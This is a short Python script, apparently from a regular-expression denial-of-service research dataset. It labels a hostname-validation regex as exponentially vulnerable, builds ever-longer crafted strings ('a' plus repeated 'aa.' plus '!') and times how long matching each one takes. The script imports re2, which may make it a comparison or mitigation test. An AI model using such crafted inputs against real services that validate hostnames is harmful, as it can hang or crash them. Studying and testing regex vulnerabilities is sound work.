#vuln pattern: EOD
#vuln degree: EXP
#mul vuln: N
#vuln location: (?:(?!\.|-)([a-z0-9\-\*]{1,63}|([a-z0-9\-]{1,62}[a-z0-9]))\.)+


import re2 as re
from time import perf_counter

regex = '^(?=^.{1,254}$)(^(?:(?!\.|-)([a-z0-9\-\*]{1,63}|([a-z0-9\-]{1,62}[a-z0-9]))\.)+(?:[a-z]{2,})$)$'
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "a" + "aa." * i + "!"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = re.search(regex, ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{LEN}: took {DURATION} seconds!")